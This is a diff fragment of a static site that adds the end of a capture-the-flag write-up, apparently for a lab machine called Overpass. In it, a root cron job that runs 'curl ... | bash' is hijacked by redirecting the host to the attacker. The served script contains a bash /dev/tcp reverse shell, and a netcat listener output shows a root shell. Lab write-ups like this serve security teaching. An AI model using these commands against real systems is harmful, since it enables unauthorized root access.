+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Update builds from latest code</span>
+</span></span><span style="display:flex;"><span>* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+</span></span></code></pre></div><p>In the hosts file I change overpass.thm to point to my attacking machine&rsquo;s IP and use python to put up a webserver to host a reverse shell in buildscript.sh. I then set up a netcat listener.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ cat buildscript.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.2.22.84/4242 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Success!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ nc -lvnp <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4242</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.2.22.84<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.15.117<span style="color:#f92672">]</span> <span style="color:#ae81ff">60460</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1205<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>root@overpass-prod:~# ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>buildStatus
+</span></span><span style="display:flex;"><span>builds
+</span></span><span style="display:flex;"><span>go
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>src
+</span></span></code></pre></div>
 
 <footer class="footline">
 	
@@ -681,16 +867,16 @@
     <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
       <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
     </div>
-    <script src="/js/clipboard.min.js?1677629191"></script>
-    <script src="/js/perfect-scrollbar.min.js?1677629191"></script>
-    <script src="/js/perfect-scrollbar.jquery.min.js?1677629191"></script>
-    <script src="/js/jquery.sticky.js?1677629191"></script>
-    <script src="/js/featherlight.min.js?1677629191"></script>
-    <script src="/js/highlight.pack.js?1677629191"></script>
+    <script src="/js/clipboard.min.js?1677721704"></script>
+    <script src="/js/perfect-scrollbar.min.js?1677721704"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js?1677721704"></script>
+    <script src="/js/jquery.sticky.js?1677721704"></script>
+    <script src="/js/featherlight.min.js?1677721704"></script>
+    <script src="/js/highlight.pack.js?1677721704"></script>
     <script>hljs.initHighlightingOnLoad();</script>
-    <script src="/js/modernizr.custom-3.6.0.js?1677629191"></script>
-    <script src="/js/learn.js?1677629191"></script>
-    <script src="/js/hugo-learn.js?1677629191"></script>
+    <script src="/js/modernizr.custom-3.6.0.js?1677721704"></script>
+    <script src="/js/learn.js?1677721704"></script>
+    <script src="/js/hugo-learn.js?1677721704"></script>
     
         
             <script src="https://unpkg.com/mermaid@8.8.0/dist/mermaid.min.js"></script>
